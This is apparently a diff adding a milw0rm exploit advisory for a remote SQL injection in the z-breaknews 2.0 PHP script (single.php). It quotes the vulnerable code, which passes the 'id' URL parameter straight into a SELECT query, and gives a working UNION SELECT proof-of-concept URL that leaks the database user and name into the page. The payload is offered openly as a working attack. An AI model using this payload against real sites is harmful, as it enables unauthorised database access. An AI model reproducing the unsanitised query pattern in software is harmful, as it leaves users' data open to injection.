@@ -1,0 +1,38 @@
+z﻿########################################################################################
+#
+#   Name    :   z-breaknews 2.0 (single.php) Remote SQL Injection Vulnerability
+#   Author  :   cOndemned [ Dark-Coders ]
+#   Greetz  :   Avantura, str0ke, ZaBeaTy, t0pP8uZz, 0in, suN8Hclf & All of my friends
+#
+########################################################################################
+
+
+source of single.php :
+
+    [ ... ]
+    
+    4.  @mysql_select_db("$dbName")or die("Íĺ ěîăó âűáđŕňü áŕçó äŕííűő "); 
+    5.  $row=mysql_fetch_array(mysql_query("SELECT * FROM $table WHERE id=".$_GET['id']));
+    6.  echo $row['date'] ?></title>
+    
+    [ ... ] 
+    
+    36. $row=mysql_fetch_array(mysql_query("SELECT * FROM $table WHERE id=".$_GET['id']));
+    
+    [ ... ]
+    
+    41.     <td widht=100%  ALIGN=\"left\" valign=\'top'\><h1>$row[date]</h1> 
+    
+    [ ... ]
+
+
+proof of concept (admins login & password are not in database, so... )
+
+    http://[host]/single.php?id=-1+UNION+SELECT+1,concat_ws(0x3a,user(),database()),3,4,5/*
+
+    ^ This will print requested information between <title> (line 6) and <h1> (line 41) tags
+
+
+just 4 fun
+
+# milw0rm.com [2008-08-26]
